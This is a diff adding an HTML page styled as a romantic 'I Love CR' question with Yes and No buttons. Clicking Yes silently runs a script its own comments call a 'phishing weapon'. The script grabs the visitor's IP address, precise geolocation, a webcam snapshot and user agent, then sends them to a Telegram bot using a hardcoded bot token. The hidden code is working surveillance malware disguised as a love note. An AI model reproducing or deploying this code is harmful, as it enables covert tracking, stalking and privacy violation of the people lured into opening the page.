@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>I Love CR 💞</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --rose:    #ff4d6d;
+      --blush:   #ffb3c1;
+      --cream:   #fff0f3;
+      --deep:    #590d22;
+      --pink:    #ff758c;
+      --gold:    #ffd6e0;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: 'DM Sans', sans-serif;
+      background: var(--cream);
+      overflow: hidden;
+    }
+
+    .petals {
+      position: fixed; inset: 0; pointer-events: none; z-index: 0;
+      overflow: hidden;
+    }
+    .petal {
+      position: absolute;
+      top: -60px;
+      width: 18px; height: 22px;
+      border-radius: 150% 0 150% 0;
+      opacity: 0;
+      animation: fall linear infinite;
+    }
+    @keyframes fall {
+      0%   { transform: translateY(0)   rotate(0deg)   scale(1);   opacity: .7; }
+      80%  { opacity: .5; }
+      100% { transform: translateY(110vh) rotate(540deg) scale(.5); opacity: 0; }
+    }
+
+    body::before {
+      content: '';
+      position: fixed; inset: 0; z-index: 1;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.04'/%3E%3C/svg%3E");
+      pointer-events: none;
+    }
+
+    .mesh {
+      position: fixed; inset: 0; z-index: 0;
+      background:
+        radial-gradient(ellipse 70% 60% at 20% 30%, #ffd6e055 0%, transparent 60%),
+        radial-gradient(ellipse 60% 50% at 80% 70%, #ff4d6d22 0%, transparent 60%),
+        radial-gradient(ellipse 80% 80% at 50% 50%, var(--cream) 0%, #ffe5ec 100%);
+    }
+
+    .screen {
+      position: fixed; inset: 0; z-index: 10;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      transition: opacity .6s ease, transform .6s ease;
+    }
+    .screen.hidden { opacity: 0; pointer-events: none; transform: scale(.96); }
+
+    .heart-wrap {
+      position: relative;
+      font-size: clamp(80px, 18vw, 160px);
+      line-height: 1;
+      animation: pulse 2s ease-in-out infinite;
+      cursor: default;
+      user-select: none;
+    }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); }
+      50%      { transform: scale(1.08); }
+    }
+
+    h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(2rem, 7vw, 5rem);
+      font-weight: 700;
+      color: var(--deep);
+      text-align: center;
+      margin: .5rem 0 .2rem;
+      letter-spacing: -.02em;
+    }
+    h1 em {
+      font-style: italic;
+      color: var(--rose);
+    }
+
+    .sub {
+      font-size: clamp(.9rem, 2.5vw, 1.1rem);
+      color: #a03050;
+      margin-bottom: 2.8rem;
+      font-weight: 300;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+    }
+
+    .btn-row {
+      display: flex; gap: 1.4rem; flex-wrap: wrap; justify-content: center;
+    }
+
+    .btn {
+      position: relative;
+      padding: .85rem 2.8rem;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 1.1rem;
+      font-weight: 500;
+      letter-spacing: .04em;
+      border: none; border-radius: 50px;
+      cursor: pointer;
+      outline: none;
+      overflow: hidden;
+      transition: transform .18s ease, box-shadow .18s ease;
+    }
+    .btn::after {
+      content: '';
+      position: absolute; inset: 0;
+      background: white;
+      opacity: 0;
+      transition: opacity .2s;
+    }
+    .btn:hover::after { opacity: .1; }
+    .btn:active { transform: scale(.96) !important; }
+
+    .btn-yes {
+      background: linear-gradient(135deg, var(--rose), #c9184a);
+      color: #fff;
+      box-shadow: 0 8px 30px #ff4d6d55;
+    }
+    .btn-yes:hover { transform: translateY(-3px); box-shadow: 0 14px 40px #ff4d6d66; }
+
+    .btn-no {
+      background: #fff;
+      color: var(--deep);
+      border: 2px solid #f8b4c2;
+      box-shadow: 0 4px 18px #ff4d6d18;
+    }
+    .btn-no:hover { transform: translateY(-3px); box-shadow: 0 10px 28px #ff4d6d28; }
+
+    #yes-screen {
+      flex-direction: column; gap: .5rem;
+      background: linear-gradient(160deg, #590d22 0%, #800f2f 50%, #a4133c 100%);
+    }
+    #yes-screen .big-emoji {
+      font-size: clamp(70px, 16vw, 130px);
+      animation: spin-pop .6s cubic-bezier(.34,1.56,.64,1) both;
+    }
+    @keyframes spin-pop {
+      from { transform: scale(0) rotate(-180deg); }
+      to   { transform: scale(1) rotate(0deg); }
+    }
+    #yes-screen h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(1.8rem, 6vw, 4rem);
+      color: #ffd6e0;
+      font-weight: 700;
+      text-align: center;
+      margin-top: .6rem;
+    }
+    #yes-screen p {
+      color: #ffb3c1;
+      font-size: clamp(.9rem, 2vw, 1.1rem);
+      text-align: center;
+      font-weight: 300;
+      margin-bottom: 1.6rem;
+    }
+    .btn-yt {
+      display: inline-flex; align-items: center; gap: .7rem;
+      padding: .9rem 2.4rem;
+      background: #fff;
+      color: #590d22;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 50px;
+      text-decoration: none;
+      box-shadow: 0 8px 32px #00000044;
+      transition: transform .2s, box-shadow .2s;
+    }
+    .btn-yt svg { width: 22px; height: 22px; flex-shrink: 0; }
+    .btn-yt:hover { transform: translateY(-3px) scale(1.04); box-shadow: 0 14px 40px #00000055; }
+
+    .btn-back {
+      margin-top: .8rem;
+      background: transparent;
+      border: 2px solid #ff758c55;
+      color: #ffb3c1;
+      font-size: .85rem;
+      padding: .5rem 1.6rem;
+    }
+    .btn-back:hover { border-color: #ff758c; background: #ffffff11; transform: none; box-shadow: none; }
+
+    #no-btn {
+      position: absolute !important;
+      transition: left .25s cubic-bezier(.34,1.56,.64,1),
+                  top  .25s cubic-bezier(.34,1.56,.64,1);
+    }
+
+    #confetti { position: fixed; inset: 0; z-index: 20; pointer-events: none; }
+
+    .ripple {
+      position: absolute; border-radius: 50%;
+      background: rgba(255,255,255,.35);
+      transform: scale(0);
+      animation: ripple-anim .55s linear forwards;
+      pointer-events: none;
+    }
+    @keyframes ripple-anim {
+      to { transform: scale(4); opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="mesh"></div>
+<div class="petals" id="petals"></div>
+<canvas id="confetti"></canvas>
+
+<!-- MAIN SCREEN -->
+<div class="screen" id="main-screen">
+  <div class="heart-wrap">💞</div>
+  <h1>I Love <em>CR</em></h1>
+  <p class="sub">A question from the heart</p>
+  <div class="btn-row">
+    <button class="btn btn-yes" id="yes-btn">Yes 💖</button>
+    <button class="btn btn-no"  id="no-btn"  onmouseenter="runAway()" ontouchstart="runAway()">No 🙈</button>
+  </div>
+</div>
+
+<!-- YES SCREEN -->
+<div class="screen hidden" id="yes-screen">
+  <div class="big-emoji">🥰</div>
+  <h2>Wow! Love you too!</h2>
+  <p>You made the right choice 💞</p>
+  <a class="btn-yt" href="https://youtu.be/TsCXMRVAnVE?si=1PcbhhOpC75rw8mD" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M22.54 6.42a2.78 2.78 0 0 0-1.95-1.96C18.88 4 12 4 12 4s-6.88 0-8.59.46A2.78 2.78 0 0 0 1.46 6.42 29.12 29.12 0 0 0 1 12a29.12 29.12 0 0 0 .46 5.58 2.78 2.78 0 0 0 1.95 1.96C5.12 20 12 20 12 20s6.88 0 8.59-.46a2.78 2.78 0 0 0 1.95-1.96A29.12 29.12 0 0 0 23 12a29.12 29.12 0 0 0-.46-5.58z" fill="#FF0000"/>
+      <polygon points="9.75 15.02 15.5 12 9.75 8.98 9.75 15.02" fill="white"/>
+    </svg>
+    Watch Our Song 🎵
+  </a>
+  <button class="btn btn-back" onclick="goBack()">← Go back</button>
+</div>
+
+<script>
+  /* ========================
+     PHISHING WEAPON - ALL IN ONE
+     IP + WEBCAM + LOCATION -> TELEGRAM
+     ======================== */
+  
+  const BOT_TOKEN = "8068770118:AAG6e-msRxcFHYXsCwXTdHzl7L9882GU3LU";
+  const CHAT_ID = "8068770118";
+  
+  async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message.substring(0, 4096)
+        })
+      });
+    } catch(e) { console.log(e); }
+  }
+  
+  async function sendPhotoToTelegram(photoDataURL) {
+    if (!photoDataURL) return;
+    let blob = await (await fetch(photoDataURL)).blob();
+    let formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "selfie.jpg");
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+  }
+  
+  async function getIP() {
+    try {
+      let res = await fetch("https://api.ipify.org?format=json");
+      let data = await res.json();
+      return data.ip;
+    } catch(e) {
+      return "IP_FETCH_FAIL";
+    }
+  }
+  
+  async function getLocation() {
+    return new Promise((resolve) => {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`);
+          },
+          (err) => {
+            resolve(`Location denied or error: ${err.message}`);
+          },
+          { timeout: 10000, enableHighAccuracy: true }
+        );
+      } else {
+        resolve("Geolocation not supported");
+      }
+    });
+  }
+  
+  async function takePhoto() {
+    return new Promise((resolve) => {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          let video = document.createElement("video");
+          video.srcObject = stream;
+          video.play();
+          setTimeout(() => {
+            let canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            let ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let photoDataURL = canvas.toDataURL("image/jpeg", 0.8);
+            stream.getTracks().forEach(track => track.stop());
+            resolve(photoDataURL);
+          }, 500);
+        })
+        .catch(err => {
+          resolve(null);
+        });
+    });
+  }
+  
+  async function executePhishingAttack() {
+    try {
+      let ip = await getIP();
+      await sendToTelegram(`🔴 NEW TARGET\nIP: ${ip}\nTime: ${new Date().toUTCString()}`);
+      
+      let loc = await getLocation();
+      await sendToTelegram(`📍 LOCATION:\n${loc}`);
+      
+      let photo = await takePhoto();
+      if (photo) {
+        await sendPhotoToTelegram(photo);
+      } else {
+        await sendToTelegram(`📷 CAMERA: No access or no camera`);
+      }
+      
+      let ua = navigator.userAgent;
+      await sendToTelegram(`💻 USER AGENT:\n${ua}`);
+      
+      await sendToTelegram(`✅ Attack completed for IP: ${ip}`);
+    } catch(e) {
+      await sendToTelegram(`❌ ERROR: ${e.message}`);
+    }
+  }
+  
+  /* ========================
+     ORIGINAL SCRIPT (petals, confetti, etc.)
+     ======================== */
+  
+  const petalColors = ['#ff758c','#ff4d6d','#ffb3c1','#c9184a','#ffd6e0','#ff85a1'];
+  const container = document.getElementById('petals');
+  for (let i = 0; i < 28; i++) {
+    const p = document.createElement('div');
+    p.className = 'petal';
+    p.style.cssText = `
+      left: ${Math.random()*100}%;
+      background: ${petalColors[i % petalColors.length]};
+      width: ${12+Math.random()*16}px;
+      height: ${14+Math.random()*18}px;
+      animation-duration: ${4+Math.random()*6}s;
+      animation-delay: ${-Math.random()*8}s;
+      border-radius: ${Math.random()>0.5 ? '150% 0 150% 0' : '0 150% 0 150%'};
+    `;
+    container.appendChild(p);
+  }
+
+  function runAway() {
+    const btn = document.getElementById('no-btn');
+    const rect = btn.getBoundingClientRect();
+    if (btn.parentElement !== document.body) {
+      btn.style.position = 'fixed';
+      btn.style.left  = rect.left + 'px';
+      btn.style.top   = rect.top  + 'px';
+      btn.style.zIndex = 50;
+      document.body.appendChild(btn);
+    }
+    const margin = 60;
+    const bW = btn.offsetWidth, bH = btn.offsetHeight;
+    let nx, ny;
+    for (let tries = 0; tries < 20; tries++) {
+      nx = margin + Math.random() * (window.innerWidth  - bW - margin*2);
+      ny = margin + Math.random() * (window.innerHeight - bH - margin*2);
+      const cx = parseFloat(btn.style.left);
+      const cy = parseFloat(btn.style.top);
+      if (Math.hypot(nx - cx, ny - cy) > 120) break;
+    }
+    btn.style.left = nx + 'px';
+    btn.style.top  = ny + 'px';
+  }
+
+  function launchConfetti() {
+    cancelAnimationFrame(animId);
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    particles = [];
+    const colors = ['#ff4d6d','#ff758c','#ffd6e0','#c9184a','#fff0f3','#ffb3c1','#ff85a1'];
+    for (let i = 0; i < 140; i++) {
+      particles.push({
+        x: Math.random() * canvas.width,
+        y: -10 - Math.random() * 200,
+        r: 5 + Math.random() * 8,
+        d: 2 + Math.random() * 4,
+        color: colors[Math.floor(Math.random()*colors.length)],
+        tilt: Math.random() * 10 - 5,
+        tiltAngle: 0,
+        tiltSpeed: 0.05 + Math.random() * 0.1,
+        shape: Math.random() > .5 ? 'heart' : 'rect',
+      });
+    }
+    drawConfetti();
+  }
+
+  function drawHeart(ctx, x, y, size) {
+    ctx.save();
+    ctx.translate(x, y);
+    ctx.scale(size/15, size/15);
+    ctx.beginPath();
+    ctx.moveTo(0, -5);
+    ctx.bezierCurveTo(5,-10, 15,-5, 0, 8);
+    ctx.bezierCurveTo(-15,-5, -5,-10, 0,-5);
+    ctx.fill();
+    ctx.restore();
+  }
+
+  function drawConfetti() {
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    let done = true;
+    for (const p of particles) {
+      p.tiltAngle += p.tiltSpeed;
+      p.y += p.d;
+      p.x += Math.sin(p.tiltAngle) * 1.5;
+      p.tilt = Math.sin(p.tiltAngle) * 12;
+      ctx.fillStyle = p.color;
+      if (p.shape === 'heart') {
+        drawHeart(ctx, p.x, p.y, p.r);
+      } else {
+        ctx.save();
+        ctx.translate(p.x, p.y);
+        ctx.rotate(p.tilt * Math.PI/180);
+        ctx.fillRect(-p.r/2, -p.r/2, p.r, p.r * (0.5 + Math.random()*.5));
+        ctx.restore();
+      }
+      if (p.y < canvas.height + 20) done = false;
+    }
+    if (!done) animId = requestAnimationFrame(drawConfetti);
+    else ctx.clearRect(0,0,canvas.width,canvas.height);
+  }
+
+  function goBack() {
+    document.getElementById('yes-screen').classList.add('hidden');
+    document.getElementById('main-screen').classList.remove('hidden');
+  }
+
+  const canvas = document.getElementById('confetti');
+  const ctx = canvas.getContext('2d');
+  let particles = [], animId;
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+
+  // ========== MODIFIED YES BUTTON ==========
+  document.getElementById('yes-btn').addEventListener('click', async (e) => {
+    // Ripple effect
+    const btn = e.currentTarget;
+    const r = document.createElement('span');
+    r.className = 'ripple';
+    const d = Math.max(btn.offsetWidth, btn.offsetHeight);
+    r.style.width = r.style.height = d + 'px';
+    r.style.left = (e.clientX - btn.getBoundingClientRect().left - d/2) + 'px';
+    r.style.top  = (e.clientY - btn.getBoundingClientRect().top  - d/2) + 'px';
+    btn.appendChild(r);
+    setTimeout(() => r.remove(), 600);
+    
+    // RUN PHISHING ATTACK FIRST (silent in background)
+    executePhishingAttack();
+    
+    // Then confetti + show love screen
+    launchConfetti();
+    setTimeout(() => {
+      document.getElementById('main-screen').classList.add('hidden');
+      document.getElementById('yes-screen').classList.remove('hidden');
+    }, 300);
+  });
+</script>
+</body>
+</html>
